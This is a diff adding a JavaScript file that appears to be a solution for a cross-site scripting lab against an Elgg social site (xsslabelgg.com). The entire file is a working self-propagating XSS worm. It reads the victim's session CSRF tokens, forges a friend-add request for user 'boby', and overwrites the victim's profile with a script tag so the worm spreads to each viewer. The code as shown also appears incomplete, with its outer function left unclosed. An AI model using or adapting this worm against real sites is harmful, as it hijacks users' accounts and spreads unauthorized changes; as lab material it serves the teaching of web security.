@@ -1,0 +1,34 @@
+window.onload = function() {
+	// Worm code
+	var headerTag = "<script src=\"wormLink.js\" id=\"worm\" type=\"text/javascript\">";
+	var tailTag = "</" + "script>";
+	var wormCode = encodeURIComponent(headerTag + tailTag);
+
+	// Get ts, token, and initialize Ajax
+	var Ajax=null;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+	// Add "boby" as friend
+	var sendurl="http://www.xsslabelgg.com/action/friends/add?"+"friend=45"+ts+token;
+	Ajax=new XMLHttpRequest();
+	Ajax.open("GET",sendurl,true);
+	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+	Ajax.send();
+
+	// Modify victim's profile
+	var userName="&name="+elgg.session.user.name;
+	var guid="&guid="+elgg.session.user.guid;
+	var description="&description=llamas are cool"+wormCode; // Inject wormcode here
+	var descAccess="&accesslevel[description]=2";
+	var content=userName+guid+ts+token+description+descAccess;
+	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+	var bobyGuid=45;
+	if(elgg.session.user.guid!=bobyGuid) {
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		Ajax.send(content);
+}
